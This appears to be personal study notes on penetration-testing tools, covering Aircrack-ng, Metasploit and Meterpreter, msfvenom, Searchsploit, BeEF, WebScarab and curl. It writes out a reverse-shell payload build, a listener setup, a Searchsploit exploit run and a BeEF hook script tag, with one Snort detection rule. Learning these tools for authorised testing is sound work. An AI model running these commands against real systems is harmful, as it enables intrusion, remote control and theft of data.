## Aircrack-NG

From .pcap file holding wireless transmission data

`aircrack-ng file.pcap`

wireshark can use cracked passcodes to decrypt rest of traffic

## recon-ng

OSSINT tool for CLI

## Metasploit

Tool for generating exploit payload then using the payload

Metasploit Modulus
- Exploits - tools to take advantage of a system weakness
- Payload - malicious code
- Encoders - encoding code or information
- Listeners - malicious code that hides in order to gain access ??
- Shellcode - code that is programmed to activate when inside the target




1) After scanning a system for vulnerabilities, choose the proper exploit
2) Craft a payload that uses exploit
3) Deliver payload

Metasploit components
- MSFconsole - main interface
- Meterpreter - shell used after successful break in


## Scanning computer for susceptibility of expoloit

`msfconsole`

msf5 `search heartbleed`

msf5 `use auxiliary/scanner/ssl/openssl_heartbleed`

msf5 auxiliary (scanner/ssl/openssl_heartbleed) `show options`

msf5 auxiliary (scanner/ssl/openssl_heartbleed) `set RHOST 192.168.0.22` etc




## Setup listener
`msfconsole`

`use exploit/multi/handler` common TCP handler

`set payload windows/meterpreter/reverse_tcp` tell handler what payload is expected to hear from

`show options`

`set LHOST <our listener IP or DNS>` set the listener host address

`set LPORT <port>` set the listener host port

`exploit` turns on listener



## Meterpreter Basics

a common payload is `windows/meterpreter/reverse_tcp`

`sessions` list open sessions

`sessions -i <sessionID>` attach to a session

`getuid` show user ID

`getwd` show working directory

`ifconfig` show network info

`sysinfo` show system information

`upload` upload a file to target

`download` download a file from target

`search` search for string

`run win_privs` show windos privilege info

`run win_enum` compreshensive suite of windows enumerations


### Post module

from meterpreter `post` then Tab Tab, to list post modules

for example `post/windows/gather/` then Tab Tab, to list post/windows/gather modules

try `post/windows/gather/enum_applications` to list applications installed

### Shell

`shell` to start a shell on remote host

This shell is in many ways limited to what can be done including downloading

This shell may also trigger notification of active shell sessions on remote machine



### MSFvenom

- create a custom payload
- deliver payload somehow
- setup listener on metasploit

`msfvenom -p windows/meterpreter/reverse_tcp lhost=<attack IP or DSN> lport=<listening port> -f exe > hack.exe`

`-f exe` set format of exploit

`-p payload` set payload

`-e encoder` sets an encoder

`-a architecture` set a file architecture

`-s` set max size of payload

`-i` iterations to use on encoder

`-x` custom executable file to use as template

`-o` outfile of payload generation

`-l` list available options for example `-l encoders` to list available encoders









meterpreter `run post/<tab>` show post 


## Searchsploit

offline database of exploit-db

`searchsploit -u` sync to grab latest repo

`searchsploit ftp remote` search for "ftp" **and** "remote" listed in an exploit's title and path

`searchsploit -t ftp remote` search title only

*hint* `searchsploit -t windows | wc -l` count number of returned exploits

`--exclude="name1|name2"` exlude from results

`-w` return URLs of webpage associated with exploit

Read the initial portion of the exploit scripts to understand how to use them

`exploits/windows/remote/43993.py`

`python exploits/windows/remote/43993.py payload=bind rhost=192.168.0.2 rport=1234`

## BeEF - zombie attack on web browsers

`sudo beef-xss`

Javascript entry

`<script src=”http://127.0.0.1:3000/hook.js” type=”text/javascript”></script>`

placed on web page, within the headers section

login to BeEf frontend

`localhost:3000`

- user: beef
- password: ?

Mitigation

browser extensions, like Vegan, detect BeEF hooks and block offending domains

snort rules, looking for cookie identifyers

`alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (flow:to_server,established; content:"Cookie|3a 20|BEEFSESSION=";)`

## Tamper Data

This tool allows to modify/view POST data before it is sent, runs as a browser extension

- Can view Basic Authentication


## WebScarab

Setup a proxy that will take all POST sends, allows to view/modify the POST prior to forwarding to final destination

- FoxyProxy

When client-side security is being employed, this allows to insert forbidden content, outside controls of webcode

Webcode limits password to be less than 8 characters to limit SQLi, webscarab allows to adjust password length at will




## Wafw00f - Web Application Firewall Detection

`wafw00f -a www.example.com`

`-a` aggressive scan

`-v -vv -vvvvv` verbose output


## CyberChef Decoding/Encoding

`gchq.github.io/CyberChef/`

CyberChef decoding

Used to encode phrases, using very common encoding methods
-encoding methods can be strung together to add complexity

Many items are encoded with base64 for robust, simple encoding
- some cookies
- basic authentication

## cURL

`curl example.com` fetch html for a website

`-I` view response headers only

`-v` view request/response text

`--request POST` set request type



## Other firefox addons

- Edit cookies
- Selenium IDE
- View Source Chart
